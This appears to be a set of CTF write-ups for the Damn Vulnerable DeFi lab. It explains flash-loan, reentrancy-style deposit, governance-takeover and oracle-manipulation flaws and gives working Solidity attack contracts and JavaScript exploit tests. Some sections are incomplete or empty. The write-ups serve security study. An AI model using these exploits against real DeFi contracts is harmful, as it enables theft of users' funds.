# CTF name: Damn Vulnerable DeFi
### Challenge name: Unstoppable
### Challenge description: There's a lending pool with a million DVT tokens in balance, offering flash loans for free.

### If only there was a way to attack and stop the pool from offering flash loans ...

### You start with 100 DVT tokens in balance.

### Challenge category => so users know the chall’s field
### Challenge points => so users know the chall’s difficulty

- - - 

In this challenge, we need to attack and stop the pool from offering flash loans. __UnstoppableLender contract__ consist of two functions, which is __depositTokens()__ and __flashLoan()__. The vulnerability is included in __flashLoan()__. 

```solidity
    assert(poolBalance == balanceBefore);
```
This line of code in __flashLoan()__ compares __poolBalance__ and __balanceBefore__. If they are not equal to each other it reverts. __poolBalance__ is only update by __depositTokens()__ and __balanceBefore__ is calculated by `damnValuableToken.balanceOf(address(this))` inside of flashLoan. If we send some tokens to UnstoppableLender contratct, __flashLoan()__ and __poolBalance__ never going to match. 



- - -

# CTF name: Damn Vulnerable DeFi
### Challenge name: Naive-Receiver
### Challenge description:
### Challenge category => so users know the chall’s field
### Challenge points => so users know the chall’s difficulty

In this challenge, we need Drain all ETH funds from the user's contract(FlashLoanReceiver.sol). In __NaiveReceiverLenderPool__ contract, the flashLoan() function does not check if borrower is a authorized user. Since flashLoan() do not authenticate, we can execute flashLoan with any contract address as borrower. We just need to repeat calling flashLoan function with user's contract address. Here is test code to exploit.

```solidity
    it('Exploit', async function () {
        for(let i=0; i<10;i++)
        this.pool.flashLoan(await this.receiver.address, 0)
    });
```

- - -

## CTF name: Damn Vulnerable DeFi
### Challenge name: Truster
### Challenge description:
### Challenge category => so users know the chall’s field
### Challenge points => so users know the chall’s difficulty


In this challenge, we need to take all 1 million DVT token from the pool. This pool offers flashLoan and it allows any function call to be executed during the flash loan. Since we can call any function from __TrusterLenderPool contract__, we can call __approve()__ function of DVT token contract. Here is attack contract. 

```solidity
contract AttackTruster{

    function attackTrusterLenderPool(IERC20 token, TrusterLenderPool pool, address attacker) public beforeAfter(token, attacker){
        uint256 balance = IERC20(token).balanceOf(address(pool));
        bytes memory approveData = abi.encodeWithSignature("approve(address,uint256)", address(this), balance);

        pool.flashLoan(0, attacker, address(token), approveData);

        token.transferFrom(address(pool), attacker, balance);
    }
}
```

Here is how it goes. We first get the balance of DVT token of pool and get payload of `approve()` function that allows attacker can withdraw the DVT tokens. Since pool will be the caller of approve function, it does not revert. Then execute flashloan. The first argement of flashLoan function should be 0, so we do not have to payback. All after that, we can withdraw 1 million DVT token using __transferFrom()__.



- - -
## CTF name: Damn Vulnerable DeFi
### Challenge name: Side entrance
### Challenge description:
### Challenge category => so users know the chall’s field
### Challenge points => so users know the chall’s difficulty


In this challenge, we must take all ETH from the lending pool. __SideEntranceLenderPool contract__ provides flashloan just like previous contracts. This pool contract also contains __deposit()__ and __withdraw()__ functions as well. The vulnerability comes from __deposit()__ function. It increases balance of `msg.sender`, however, it does not check if the balance of pool has really increased. 

There is a line of code in __flashLoan()__:  `IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();`. This line of code allows `msg.sender` to execute __execute()__ function from itself. We can call __deposit()__ function during flash loan to increase balance of ourselves, and we can withdraw.

Here is attack contract:

```soildity
contract FlashLoanEtherReceiver {
    function execute() external payable {
        SideEntranceLenderPool(msg.sender).deposit{value: msg.value}();
    }

    function attackSideEntranceLenderPool(SideEntranceLenderPool pool, address attacker) public {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        payable(attacker).transfer(address(this).balance);
    }

    receive() external payable{}
}
```

By calling, attackSideEntranceLenderPool, we execute flashLoan, and during flashLoan, it will execute __execute()__ function from attack contract which will deposit flash loan amount. Then we withdraw from the pool and send stolen ETH to attacker.


- - -
## CTF name: Damn Vulnerable DeFi
### Challenge name: The rewarder
### Challenge description:
### Challenge category => so users know the chall’s field
### Challenge points => so users know the chall’s difficulty


In this challenge, we must to claim most rewards for ourselves with no DVT token. The challenge also provides flash loan and reward pool. We need to keep an eye on reward pool, `TheRewarderPool.sol`. After deposit DVT token for 5 days, we can get rewards. However, there are already rewards in the pool from previous round, and rewarders have not claimed the reward. It means that 


- - -
## CTF name: Damn Vulnerable DeFi
### Challenge name: Selfie
### Challenge description:
### Challenge category => so users know the chall’s field
### Challenge points => so users know the chall’s difficulty


In this challenge, we must drain all ETH from Governance pool. According to `_hasEnoughVotes()` function, it is possible to make any action queue if we have more than half of governance token. Since we utilize flash loan of governance token, we can make action queue to call `drainAllFunds()` function. Here is attack contract:

```solidity
contract AttackTheSelfiePool {

    address public selfiePool;
    address public liquidityToken;
    address public simpleGovernance;
    address public attacker_owner;

    uint256 actionId;

    constructor(address _selfiePool, address _damnValuableTokenSnapshot, address _simpleGovernance) {
        selfiePool = _selfiePool;
        liquidityToken = _damnValuableTokenSnapshot;
        simpleGovernance = _simpleGovernance;
        attacker_owner = msg.sender;
    }

    function attackTheSelfiePool() public {
        uint256 borrowAmount = DamnValuableTokenSnapshot(liquidityToken).balanceOf(address(selfiePool));
        SelfiePool(selfiePool).flashLoan(borrowAmount);
    }

    function receiveTokens(address token,uint256 borrowAmount) public {
        DamnValuableTokenSnapshot(liquidityToken).snapshot();

        bytes memory data = abi.encodeWithSignature("drainAllFunds(address)", tx.origin);
        actionId = SimpleGovernance(simpleGovernance).queueAction(selfiePool, data, 0);
        DamnValuableTokenSnapshot(liquidityToken).transfer(msg.sender, borrowAmount);
    }

    function executeAction_governance() public payable{
        SimpleGovernance(simpleGovernance).executeAction(actionId);
    }
}
```

First, by calling `attackTheSelfiePool()` function, we can get flash loan, and during flash loan it will call `receiveTokens()` function. `receiveTokens()` function will queueAction with payload of `drainAllFunds()` function and payback the flash loan. After 2 days, just executing action will drain all tokens.


- - -
## CTF name: Damn Vulnerable DeFi
### Challenge name: Compromised
### Challenge description:
### Challenge category => so users know the chall’s field
### Challenge points => so users know the chall’s difficulty





- - -
## CTF name: Damn Vulnerable DeFi
### Challenge name: Puppet
### Challenge description:
### Challenge category => so users know the chall’s field
### Challenge points => so users know the chall’s difficulty

In this challenge, we must steal all tokens from the lending pool. Also the challenge provide UniswapV1 as oracle. However, UniswapV1 has only 10 ETH and 10 DVT, which means that the exchange rate can be easily changed. Since `calculateDepositRequired()` function in `borrow()` function is using UniswapV1, we can manipulate token price by manipulating UniswapV1. 

First we need to approve UniswapV1 to utilze our token, and exchange all DVT token with just 1 ether. Then it will drop the required deposit amount for borrow function to very low like 0.00019... which means we can borrow 1 DVT with 0.00019 ETH. The implementation for what I explained is below.


```javascript
    it('Exploit', async function () {
        const deadline = (await ethers.provider.getBlock("latest")).timestamp * 2;
        await this.token.connect(attacker).approve(this.uniswapExchange.address, ATTACKER_INITIAL_TOKEN_BALANCE);
        await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(ethers.utils.parseEther('999'), '1', deadline);
        
        const value = {value: ethers.utils.parseEther("24.0")}        
        const attackValue = ethers.utils.parseEther("100000")
        this.lendingPool.connect(attacker).borrow(attackValue, value);
    });
```


- - -
## CTF name: Damn Vulnerable DeFi
### Challenge name: Puppet v2
### Challenge description:
### Challenge category => so users know the chall’s field
### Challenge points => so users know the chall’s difficulty

In this challenge, we must steal million DVT from the pool. This challenge is very similar to previous challenge, puppet. The difference is that puppet v2 is using Uniswap v2 exchange as a price oracle, along with the recommended utility libraries. However, the oracle still can be manipulated. First we can swap 10000 DVT token to ETH using `swapExactTokensForETH()` function from Uniswap Router. Then we just need to calculate the deposit amount to borrow all DVT from pool. Since we use WeTH to borrow DVT, deposit calculated amount to WETH. Then borrow DVT balance of pool.

```javascript
    it('Exploit', async function () {
        const deadline = (await ethers.provider.getBlock('latest')).timestamp * 2;
        await this.token.connect(attacker).approve(this.uniswapRouter.address, ATTACKER_INITIAL_TOKEN_BALANCE);
        await this.uniswapRouter.connect(attacker).swapExactTokensForETH(ATTACKER_INITIAL_TOKEN_BALANCE, 0, [this.token.address, this.weth.address], attacker.address, deadline);
        
        let calculatedDeposit = await ethers.utils.formatEther(ethers.BigNumber.from(await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)));
        let calculatedDepositToStringInETH = ethers.utils.parseEther((Math.ceil(calculatedDeposit * 10) / 10).toString());

        await this.weth.connect(attacker).deposit({value: calculatedDepositToStringInETH } )

        this.weth.connect(attacker).approve(this.lendingPool.address, calculatedDepositToStringInETH);
        this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE);
    });
```

- - -
## CTF name: Damn Vulnerable DeFi
### Challenge name: Free rider 
### Challenge description:
### Challenge category => so users know the chall’s field
### Challenge points => so users know the chall’s difficulty

In this challenge, we have to take 6 NFT from marketplace with only 0.5 ether. In addition, NFT is 15 ether worth. We can find the vulnerability in the `_buyOne()` function. Here is the line that is vulnerable.

```
    token.safeTransferFrom(token.ownerOf(tokenId), msg.sender, tokenId);
    payable(token.ownerOf(tokenId)).sendValue(priceToPay);
```

If someone buys NFT, the marketplace transfer the NFT to buyer first. Then send value to token owner, which is now buyer. If only we could get 15 ETH, we can take all NFTs from marketplace. 






